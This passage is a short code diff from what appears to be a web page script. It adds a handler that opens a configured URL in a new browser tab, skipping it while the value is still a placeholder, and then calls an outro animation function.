+        let url=window._ZEROX_URL_OVERRIDE||ZEROX_URL;
+        if(url&&url.indexOf('your-zerox')===-1){
+            if(!/^https?:\/\//i.test(url)) url='https://'+url;
+            window.open(url,'_blank','noopener');
+        }
+      };
     }
 
     startOutroBorder();
